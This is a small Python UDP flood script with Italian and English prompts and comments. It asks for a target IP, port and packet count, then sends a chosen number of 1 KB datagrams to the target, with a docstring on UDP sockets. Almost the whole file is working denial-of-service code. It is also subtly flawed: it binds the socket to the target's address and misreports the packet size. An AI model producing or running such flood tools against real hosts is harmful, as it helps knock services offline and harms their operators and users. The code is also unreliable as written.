import socket
import sys

target_ip = input("Insert Target IP: ")
port = int(input("Insert port: "))
num_packets = int(input("Inserisci numero di pacchetti da inviare: "))

target = (target_ip,port)

#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #IPv4 e TCP
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #IPv4 e UDP


"""
Why there is no "accept()" for UDP?

Because UDP is a connectionless protocol, you don't need it. You get remote address information with every incoming UDP datagram, so you know who it's from, so you don't need a per-connection socket to tell you. You don't 'have to apply lots of UDP ports' at all. You only need one


So we will use ".recvfrom"
or ".sendto" ----> https://pythontic.com/modules/socket/sendto
"""


s.bind((target_ip, port))
scelta = input("Bound correcly, proceed the UDP flood? (Y/N) >>> ")

#Creo un pacchetto di 1KB
num = 1
packet = num.to_bytes(1024,"big")
packet_size = sys.getsizeof(packet)

#print("byte: ", packet)

if (scelta == "Y"):
	for i in range(num_packets):
		s.sendto(packet, target)
		print("Sent Packet number {} of {} bytes".format(i,packet_size))
else:
	print("Ok, next time :(")

s.close()
